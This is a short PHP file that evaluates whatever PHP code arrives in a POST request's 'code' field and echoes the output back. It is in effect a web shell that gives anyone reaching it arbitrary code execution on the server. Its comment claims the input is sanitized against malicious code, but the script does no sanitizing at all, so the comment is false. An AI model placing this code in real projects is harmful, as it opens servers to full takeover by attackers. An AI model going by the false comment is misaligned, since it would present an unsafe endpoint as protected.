<?php
// Sanitize the input to avoid malicious code execution
$phpCode = isset($_POST['code']) ? $_POST['code'] : '';

// Capture the output of the evaluated PHP code
ob_start();
eval($phpCode);
$output = ob_get_clean();

// Return the output
echo $output;
?>
